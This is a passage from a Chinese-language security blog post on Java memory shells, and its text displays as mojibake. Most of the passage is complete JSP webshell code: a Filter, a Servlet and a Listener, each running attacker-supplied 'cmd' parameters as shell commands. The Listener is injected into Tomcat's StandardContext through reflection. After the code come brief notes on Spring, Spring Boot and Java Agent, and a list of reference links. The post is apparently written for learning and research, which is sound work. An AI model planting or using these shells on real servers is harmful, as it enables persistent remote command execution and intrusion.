<span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>    out.println(output);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure>





<h4 id="æœ‰å›æ˜¾çš„-Filter-æœ¨é©¬ï¼š"><a href="#æœ‰å›æ˜¾çš„-Filter-æœ¨é©¬ï¼š" class="headerlink" title="æœ‰å›æ˜¾çš„ Filter æœ¨é©¬ï¼š"></a><font style="color:rgb(80, 80, 92);">æœ‰å›æ˜¾çš„ Filter æœ¨é©¬ï¼š</font></h4><p><font style="color:rgb(80, 80, 92);"></font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>  <br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>            <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">resp</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>            <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>                <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    isLinux = <span class="hljs-literal">false</span>;<br>                &#125;<br>                String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                resp.getWriter().write(output);<br>                resp.getWriter().flush();<br>            &#125;<br>            chain.doFilter(request, response);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br><br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>

<h4 id="æœ‰å›æ˜¾çš„-Servlet-æœ¨é©¬ï¼š"><a href="#æœ‰å›æ˜¾çš„-Servlet-æœ¨é©¬ï¼š" class="headerlink" title="æœ‰å›æ˜¾çš„ Servlet æœ¨é©¬ï¼š"></a>æœ‰å›æ˜¾çš„ Servlet æœ¨é©¬ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>        <span class="hljs-keyword">private</span> String message;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>            message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// è®¡ç®—æœºå¼¹å‡º</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-comment">// MemShell?cmd=whoami  ä»»æ„å‘½ä»¤æ‰§è¡Œ</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br><br>                    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br>                    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream));<br>                    String line;<br>                    <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                        res.getWriter().println(line);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>



<h4 id="æ— å›æ˜¾çš„-Listener-æœ¨é©¬ï¼š"><a href="#æ— å›æ˜¾çš„-Listener-æœ¨é©¬ï¼š" class="headerlink" title="æ— å›æ˜¾çš„ Listener æœ¨é©¬ï¼š"></a>æ— å›æ˜¾çš„ Listener æœ¨é©¬ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%--<br>  Created by IntelliJ IDEA.<br>  User: XVSHIFU<br>  Date: <span class="hljs-number">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2</span><br>  Time: <span class="hljs-number">16</span>:<span class="hljs-number">24</span><br>  To change <span class="hljs-built_in">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>         &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span>&#123;<br>        &#125;<br>    &#125;<br>%&gt;<br><br>&lt;%<br>    <span class="hljs-comment">// 1. è·å– StandardContext ç±»</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br><br>    <span class="hljs-comment">// 2. æ·»åŠ ç›‘å¬å™¨</span><br>    <span class="hljs-type">ShellListener</span> <span class="hljs-variable">shellListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShellListener</span>();<br>    context.addApplicationEventListener(shellListener);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>



<h2 id="5-Spring-åŸºç¡€"><a href="#5-Spring-åŸºç¡€" class="headerlink" title="5. Spring åŸºç¡€"></a>5. Spring åŸºç¡€</h2><p><font style="background-color:#FBDE28;">æ€»ç»“ä¸€å¥è¯ï¼šSpringå°±æ˜¯ä¸€ä¸ªè½»é‡çº§çš„æ§åˆ¶åè½¬ï¼ˆIOCï¼‰å’Œé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ˆAOPï¼‰çš„æ¡†æ¶</font></p>
<h3 id="5-1-ä»€ä¹ˆæ˜¯Spring"><a href="#5-1-ä»€ä¹ˆæ˜¯Spring" class="headerlink" title="5.1 ä»€ä¹ˆæ˜¯Spring"></a>5.1 ä»€ä¹ˆæ˜¯Spring</h3><p>Springæ˜¯ä¸€ä¸ªè½»é‡çº§çš„Javaå¼€æºæ¡†æ¶ï¼Œç”¨äºé…ç½®ã€ç®¡ç†å’Œç»´æŠ¤Beanï¼ˆç»„ä»¶ï¼‰çš„ä¸€ç§æ¡†æ¶ï¼Œå…¶æ ¸å¿ƒç†å¿µå°±æ˜¯<strong>IoC(Inversion of Control,æ§åˆ¶åè½¬)</strong> å’Œ <strong>AOP(AspectOrientedProgrammingï¼Œ é¢å‘åˆ‡é¢ç¼–ç¨‹)</strong>ã€‚ç°å¦‚ä»ŠSpringå…¨å®¶æ¡¶å·²æ˜¯ä¸€ä¸ªåºå¤§çš„å®¶æ—</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509336.webp" srcset="/img/loading.gif" lazyload></p>
<p>Springçš„å‡ºç°å¤§å¤§ç®€åŒ–äº†JavaEEçš„å¼€å‘æµç¨‹ï¼Œå‡å°‘äº†Javaå¼€å‘æ—¶å„ç§ç¹ççš„é…ç½®ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508481.webp" srcset="/img/loading.gif" lazyload></p>
<p>Springæ¡†æ¶çš„æ ¸å¿ƒä¹‹ä¸€å°±æ˜¯åˆ†å±‚ï¼Œå…¶ç”±è®¸å¤šå¤§å¤§å°å°çš„ç»„ä»¶æ„æˆï¼Œæ¯ç§ç»„ä»¶éƒ½å®ç°ä¸åŒåŠŸèƒ½ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509118.webp" srcset="/img/loading.gif" lazyload></p>
<h3 id="5-2-SpringBoot"><a href="#5-2-SpringBoot" class="headerlink" title="5.2 SpringBoot"></a>5.2 SpringBoot</h3><p><font style="color:rgba(0, 0, 0, 0.9);">Spring Boot åŸºäº Spring å¼€å‘ï¼ŒSpirng Boot æœ¬èº«å¹¶ä¸æä¾› Spring æ¡†æ¶çš„æ ¸å¿ƒç‰¹æ€§ä»¥åŠæ‰©å±•åŠŸèƒ½ï¼Œåªæ˜¯ç”¨äºå¿«é€Ÿã€æ•æ·åœ°å¼€å‘æ–°ä¸€ä»£åŸºäº Spring æ¡†æ¶çš„åº”ç”¨ç¨‹åºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒå¹¶ä¸æ˜¯ç”¨æ¥æ›¿ä»£ Spring çš„è§£å†³æ–¹æ¡ˆï¼Œè€Œæ˜¯å’Œ Spring æ¡†æ¶ç´§å¯†ç»“åˆç”¨äºæå‡ Spring å¼€å‘è€…ä½“éªŒçš„å·¥å…·ã€‚Spring Boot ä»¥</font><strong><font style="color:rgba(0, 0, 0, 0.9);">çº¦å®šå¤§äºé…ç½®çš„æ ¸å¿ƒæ€æƒ³</font></strong><font style="color:rgba(0, 0, 0, 0.9);">ï¼Œé»˜è®¤å¸®æˆ‘ä»¬è¿›è¡Œäº†å¾ˆå¤šè®¾ç½®ï¼Œå¤šæ•° Spring Boot åº”ç”¨åªéœ€è¦å¾ˆå°‘çš„ Spring é…ç½®ã€‚åŒæ—¶å®ƒé›†æˆäº†å¤§é‡å¸¸ç”¨çš„ç¬¬ä¸‰æ–¹åº“é…ç½®ï¼ˆä¾‹å¦‚ Redisã€MongoDBã€Jpaã€RabbitMQã€Quartz ç­‰ç­‰ï¼‰ï¼ŒSpring Boot åº”ç”¨ä¸­è¿™äº›ç¬¬ä¸‰æ–¹åº“å‡ ä¹å¯ä»¥é›¶é…ç½®çš„å¼€ç®±å³ç”¨ã€‚</font></p>
<p><font style="color:rgba(0, 0, 0, 0.9);">ç®€å•æ¥è¯´å°±æ˜¯SpringBootå…¶å®ä¸æ˜¯ä»€ä¹ˆæ–°çš„æ¡†æ¶ï¼Œå®ƒé»˜è®¤é…ç½®äº†å¾ˆå¤šæ¡†æ¶çš„ä½¿ç”¨æ–¹å¼ï¼Œå°±åƒmavenæ•´åˆäº†æ‰€æœ‰çš„jaråŒ…ï¼Œspring bootæ•´åˆäº†æ‰€æœ‰çš„æ¡†æ¶ ã€‚</font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.9);">Spring Bootçš„ä¸»è¦ä¼˜ç‚¹ï¼š</font></strong></p>
<ul>
<li><font style="color:rgba(0, 0, 0, 0.9);">ä¸ºæ‰€æœ‰Springå¼€å‘è€…æ›´å¿«çš„å…¥é—¨</font></li>
<li><strong><font style="color:rgba(0, 0, 0, 0.9);">å¼€ç®±å³ç”¨</font></strong><font style="color:rgba(0, 0, 0, 0.9);">ï¼Œæä¾›å„ç§é»˜è®¤é…ç½®æ¥ç®€åŒ–é¡¹ç›®é…ç½®</font></li>
<li><font style="color:rgba(0, 0, 0, 0.9);">å†…åµŒå¼å®¹å™¨ç®€åŒ–Webé¡¹ç›®</font></li>
<li><font style="color:rgba(0, 0, 0, 0.9);">æ²¡æœ‰å†—ä½™ä»£ç ç”Ÿæˆå’ŒXMLé…ç½®çš„è¦æ±‚</font></li>
</ul>
<h2 id="6-java-Agent"><a href="#6-java-Agent" class="headerlink" title="6. java Agent"></a>6. java Agent</h2><h3 id="6-1-ä»€ä¹ˆæ˜¯Java-Agentï¼Ÿ"><a href="#6-1-ä»€ä¹ˆæ˜¯Java-Agentï¼Ÿ" class="headerlink" title="6.1 ä»€ä¹ˆæ˜¯Java Agentï¼Ÿ"></a>6.1 ä»€ä¹ˆæ˜¯Java Agentï¼Ÿ</h3><p>Javaæ˜¯ä¸€ç§é™æ€å¼ºç±»å‹è¯­è¨€ï¼Œåœ¨è¿è¡Œä¹‹å‰å¿…é¡»å°†å…¶ç¼–è¯‘æˆ<code>.class</code>å­—èŠ‚ç ï¼Œç„¶åå†äº¤ç»™JVMå¤„ç†è¿è¡Œã€‚Java Agent å°±æ˜¯ä¸€ç§èƒ½åœ¨ä¸å½±å“æ­£å¸¸ç¼–è¯‘çš„å‰æä¸‹ï¼Œä¿®æ”¹Javaå­—èŠ‚ç ï¼Œè¿›è€ŒåŠ¨æ€åœ°ä¿®æ”¹å·²åŠ è½½æˆ–æœªåŠ è½½çš„ç±»ã€å±æ€§å’Œæ–¹æ³•çš„æŠ€æœ¯ã€‚</p>
<p>å¯¹äºAgentï¼ˆä»£ç†ï¼‰æ¥è®²ï¼Œå…¶å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯åœ¨JVMå¯åŠ¨å‰åŠ è½½çš„<code>premain-Agent</code>ï¼Œå¦ä¸€ç§æ˜¯JVMå¯åŠ¨ä¹‹ååŠ è½½çš„<code>agentmain-Agent</code>ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£æˆä¸€ç§ç‰¹æ®Šçš„Interceptorï¼ˆæ‹¦æˆªå™¨ï¼‰ï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508125.jpeg" srcset="/img/loading.gif" lazyload alt="premain-Agent"></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508271.jpeg" srcset="/img/loading.gif" lazyload alt="agentmain-Agent"></p>
<h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/rebeyond/p/9686213.html">ã€åŸåˆ›ã€‘åˆ©ç”¨â€œè¿›ç¨‹æ³¨å…¥â€å®ç°æ— æ–‡ä»¶ä¸æ­»webshell</a></p>
<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">Javaå®‰å…¨å­¦ä¹ â€”â€”å†…å­˜é©¬ - æ«ã®Blog</a></p>
<p><a target="_blank" rel="noopener" href="http://101.36.122.13:4000/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/#J9TFY">Springå†…å­˜é©¬ | CurlySeanâ€™s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/javaagent-tomcat-memshell/#%E7%AE%80%E8%BF%B0%E5%86%85%E5%AD%98shell">Java Agentå®ç°ååºåˆ—åŒ–æ³¨å…¥å†…å­˜shell</a></p>
<p><a target="_blank" rel="noopener" href="https://su18.org/post/memory-shell/">JavaWeb å†…å­˜é©¬ä¸€å‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…«</a></p>
<p><a target="_blank" rel="noopener" href="https://su18.org/post/memory-shell-2/">JavaWeb å†…å­˜é©¬äºŒå‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…«</a></p>
<p><a target="_blank" rel="noopener" href="https://www.4hou.com/posts/zlkq">Shellä¸­çš„å¹½çµç‹è€…â€”JAVAWEB å†…å­˜é©¬ ã€è®¤çŸ¥ç¯‡ã€‘ - å˜¶å¼ RoarTalk â€“ ç½‘ç»œå®‰å…¨è¡Œä¸šç»¼åˆæœåŠ¡å¹³å°,4hou.com</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/433972.html">Javaå†…å­˜é©¬â€”â€”Tomcat Valveå‹çš„ä¸‰ç§æ³¨å…¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<p><a target="_blank" rel="noopener" href="https://hilang.cloud/java-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9Aspring-boot-controller-%E5%86%85%E5%AD%98%E9%A9%AC/">Java å†…å­˜é©¬ï¼ˆå››ï¼‰ï¼šSpring Boot Controller å†…å­˜é©¬ | æ¸æ€€çš„åšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://stoocea.github.io/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html#2-Controller-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Springå‹å†…å­˜é©¬åˆ†æ</a></p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/servlet/servlet-intro.html">Servlet ç®€ä»‹ | èœé¸Ÿæ•™ç¨‹</a></p>
<p><a target="_blank" rel="noopener" href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">Springå†…å­˜é©¬å­¦ä¹ </a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11493">Springå†…å­˜é©¬â€”â€”Controller&#x2F;Interceptoræ„é€ </a></p>
<p>[åŸºç¡€ç¯‡ - Javassist ä½¿ç”¨æŒ‡å—](<a target="_blank" rel="noopener" href="https://changeyourway.github.io/2024/06/07/Java">https://changeyourway.github.io/2024/06/07/Java</a> å®‰å…¨&#x2F;åŸºç¡€ç¯‡-javassistç”¨æ³•æŒ‡å—&#x2F;)</p>
<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1145#header-id-20">Javaå®‰å…¨å­¦ä¹ â€”â€”ROMEååºåˆ—åŒ– - æ«ã®Blog</a> ï¼ˆä½¿ç”¨Javassistç¼©çŸ­æ¶æ„classï¼‰</p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/javaagent-tomcat-memshell/">Java Agentå®ç°ååºåˆ—åŒ–æ³¨å…¥å†…å­˜shell</a></p>
<p><a target="_blank" rel="noopener" href="http://101.36.122.13:4000/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC">Agentå†…å­˜é©¬ | CurlySeanâ€™s Blog</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Javaå®‰å…¨</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/java%E5%AE%89%E5%85%A8/" class="print-no-link">#javaå®‰å…¨</a>
      
        <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="print-no-link">#å†…å­˜é©¬</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Java å†…å­˜é©¬ç¬¬ä¸€ç¯‡ - åŸºç¡€</div>
      <div>http://xvshifu.github.io/2025/11/08/Java å†…å­˜é©¬ç¬¬ä¸€ç¯‡ - åŸºç¡€/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Xvsf</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2025å¹´11æœˆ8æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%BA%8C%E7%AF%87%20-%20Tomcat%20%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java å†…å­˜é©¬ç¬¬äºŒç¯‡ - Tomcat å†…å­˜é©¬">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Java å†…å­˜é©¬ç¬¬äºŒç¯‡ - Tomcat å†…å­˜é©¬</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/11/02/web%E6%BC%8F%E6%B4%9E/" title="Webæ¼æ´é¶åœºç»ƒä¹ (ä¸å®šæ—¶æ›´æ–°)">
                        <span class="hidden-mobile">Webæ¼æ´é¶åœºç»ƒä¹ (ä¸å®šæ—¶æ›´æ–°)</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
